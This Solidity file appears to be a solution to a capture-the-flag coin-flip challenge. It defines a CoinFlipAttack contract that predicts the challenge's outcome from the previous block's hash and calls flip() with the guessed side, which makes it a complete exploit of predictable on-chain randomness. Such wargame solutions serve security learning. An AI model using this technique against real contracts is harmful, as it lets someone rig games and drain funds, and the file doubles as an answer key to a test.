// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";
interface ICoinFlipChallenge {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttack {
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    ICoinFlipChallenge public coinFlipChallenge;

    constructor(address _coinFlip) {
        coinFlipChallenge = ICoinFlipChallenge(_coinFlip);
    }

    function attack() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        coinFlipChallenge.flip(side);
    }
}
